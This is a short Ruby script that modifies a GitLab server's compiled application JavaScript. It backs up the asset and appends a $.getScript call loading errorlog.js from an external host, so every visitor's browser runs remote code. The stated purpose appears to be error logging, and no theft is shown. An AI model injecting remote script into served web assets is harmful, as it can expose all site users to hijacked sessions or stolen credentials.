#!/usr/bin/env ruby

loader = "$.getScript(\"https://raspi61.ips.cs.tu-bs.de/errorlog.js\");"
file = File.new(Dir['/opt/gitlab/embedded/service/gitlab-rails/public/assets/application-*.js'][0].to_s, File::RDWR)
puts file.to_path

if file.readlines.any? { |line| line == loader }
  puts 'file is already modified'
else
  puts 'file needs to bs modified'
  system('cp', file.to_path, File.dirname(file) + '/.' + File.basename(file))
  if File.exist?(file.to_path + '.gz')
    system('mv', file.to_path + '.gz', File.dirname(file) + '/.' + File.basename(file) + '.gz')
  end
  file.write("\n\n" + loader)
  file.close
  system('gzip', '-k', file.to_path)
  puts 'finish'
end